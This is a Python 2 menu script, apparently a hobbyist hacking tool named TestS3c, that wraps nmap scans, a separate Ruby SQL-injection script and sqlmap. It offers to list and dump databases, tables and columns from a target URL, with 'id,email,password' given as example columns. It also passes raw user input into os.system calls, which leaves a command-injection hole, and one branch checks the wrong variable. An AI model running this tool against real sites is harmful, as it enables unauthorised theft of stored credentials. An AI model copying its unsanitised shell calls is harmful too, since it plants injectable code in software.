 #!/usr/bin/env python
 
#coded By MriNJ
import os
os.system("clear")
#//////////////////////////// Start Script ///////////////////////
print '''
		================================================
		#!        TestS3c | V1.0                      !#
		#!        The Cy83r W0rlD Needs to Speed      !#
		#!        Short Your Time With This Script    !#
		#!        Coded By MriNj                      !#
		#!        Twitter : @0xiNj                    !#
		#!        G2: L13Team - JM511 - Lester        !#
		#! [--->] Supports [Kali - BackBox - Parrot]  !#
		================================================
\n'''
		
print '''
 1) Check Applications on Server      [*] Need nmap
 2) Check SQLiNJ on Server            [*] Need Ruby
 3) Check Ports On Server             [*] Need nmap
 4) iNjEasy                           [*] Need SqlMap
 
 
[*] To Exit Press Enter :) \n'''
Mu = raw_input("[+] Enter Your Choice: ")
os.system("clear")
if Mu == "1":
	ipH = raw_input("Enter IP Host: ")
	ha = os.system("nmap -A "+ipH)

if Mu == "2":
	ipH = raw_input("Enter IP Host: ")
	iPs = os.system("ruby SQLiNJ.rb "+ipH+ " id")
	if ipH == 0:
		print "[*] Check OutPut SiteSQLiNj.txt "
	else:
		print "[X] Enter IP Host !"

# you need Nmap to work with you !
if Mu == "3":
	ipW = raw_input("Enter IP Host: ")
	os.system("sudo nmap -sS "+ipW)
# you need SqlMap to work with you !
if Mu == "4":
	print '''
       _$_   
       # #  ####   ##  **   <<iNjEasy>>
       # #  ## #   ##  ##
       # #  ##  #  ##  ##
        V   ##   ####  ##
                      ##


Enter Url [ex] http://www.EX.com/index.php?id=[*]:"\n'''
	Url1 = raw_input("[#] Enter Url: ")
	os.system('clear')
	print '''
        ___
       __H__
 ___ ___[)]_____ ___ ___  {SqlMap}
|_ -| . [)]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V          |_|   
      
      
      
 1) Show Databases
 2) show Tables
 3) show Columns
 4) Dump Table
 5) Dump Columns\n'''
	Mu2 = raw_input("[+] Enter Your Choice: ") #
	if Mu2 == "1":
		ShD = os.system("sqlmap -u "+Url1+ " --dbs" )
		print "[#] Copy The Names of DataBases You Will Need Later"
	if Mu2 == "2":
		DbN = raw_input("[#] Enter Name of DataBase: ")
		SDbn = os.system("sqlmap -u "+Url1+ " -D "+DbN+ " --tables" )
		print "[#] Copy The Names of Tables You Will Need Later"
	if Mu2 == "3":
		DbN = raw_input("[#] Enter Name of DataBase: ")
		TbD = raw_input("[#] Enter Name of Table: ")
		DbTC = os.system("sqlmap -u "+Url1+ " -D "+DbN+ " -T "+TbD+ " --columns" )
	if Mu2 == "4":
		DbN = raw_input("[#] Enter Name of DataBeas: ")
		TbD = raw_input("[#] Enter Name of Table: ")
		DbTC = os.system("sqlmap -u "+Url1+ " -D "+DbN+ " -T "+TbD+ " --dump" )
	if Mu2 == "5":
		DbN = raw_input("[#] Enter Name of DataBaes: ")
		TbD = raw_input("[#] Enter Name of Table: ")
		print "[*] Enter Name of columns [Ex] id,email,password "
		TCbD = raw_input("[#] Enter Name of columns: ")
		DbTCD = os.system("sqlmap -u "+Url1+ " -D "+DbN+ " -T "+TbD+ " -C "+TCbD+ " --dump" )

#//////////////////////////////////////////////// End Script ////////////
